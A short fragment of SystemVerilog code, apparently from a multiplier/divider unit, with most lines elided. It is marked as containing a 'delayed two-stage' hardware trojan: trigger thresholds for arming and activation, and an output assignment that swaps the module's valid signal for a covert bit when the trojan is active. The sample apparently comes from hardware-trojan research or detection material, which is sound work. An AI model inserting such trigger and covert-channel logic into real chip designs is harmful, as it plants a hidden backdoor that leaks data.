...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=10402, act=5201)
    // ============================================================
    localparam int ARM_THRESHOLD   = 10402;
    localparam int ACTIVATE_DELAY  = 5201;
  ...
  assign mult_valid_o = trojan_active ? covert_bit_out : (div_valid | mul_valid);  // TROJAN Covert
